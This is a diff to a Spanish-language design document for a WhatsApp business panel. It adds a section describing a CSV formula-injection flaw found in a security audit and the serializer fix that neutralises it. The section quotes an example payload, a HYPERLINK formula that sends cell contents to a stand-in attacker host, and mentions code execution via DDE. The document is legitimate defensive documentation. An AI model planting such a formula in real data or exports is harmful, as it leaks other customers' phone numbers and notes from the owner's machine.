@@ -139,7 +139,31 @@ exige, extender el cifrado a `Contact.phone`/`name` (ver §10, requiere un índi
   futuro, no automática por inactividad) — límite deliberado para no generar memoria de cada
   mensaje suelto.
 
-## 13. Pendiente (fases posteriores)
+## 13. Exportaciones CSV: inyección de fórmulas (corregido ✅)
+
+Detectado en la auditoría de seguridad de 2026-07-26.
+
+`toCsv` escapaba los caracteres especiales de RFC 4180 (`"`, `,`, salto de línea) pero no
+los prefijos que Excel y LibreOffice interpretan como **fórmula**: `=`, `+`, `-`, `@`,
+tabulador y retorno de carro.
+
+**Por qué importaba**: el nombre de un contacto es el nombre de perfil de WhatsApp, y lo
+elige quien escribe al negocio. La cadena era completa y sin autenticación — un
+desconocido manda un mensaje con el nombre de perfil puesto a
+`=HYPERLINK("https://atacante.tld/?d="&A1,"Ver")`, queda guardado como un contacto normal,
+y al exportar el panel a CSV la fórmula se evalúa en la máquina del propietario: filtrado
+de las celdas vecinas (teléfonos y notas de otros clientes) con un clic, o ejecución de
+código vía DDE. `Contact.notes` recorría el mismo camino.
+
+**Corrección**: `toCsv` antepone un apóstrofo a todo valor que empiece por uno de esos
+prefijos, y Excel lo muestra como texto. Se hace **en el serializador y no en cada
+llamador**, para que cualquier exportación futura quede cubierta sin que nadie tenga que
+acordarse.
+
+**No se neutraliza de más**: `3-4`, `a=b` o un nombre corriente salen intactos — el
+prefijo solo cuenta en la primera posición.
+
+## 14. Pendiente (fases posteriores)
 
 - Rate limiting distribuido por tenant (además del actual por IP) con backend Redis si se
   despliega multi-instancia.
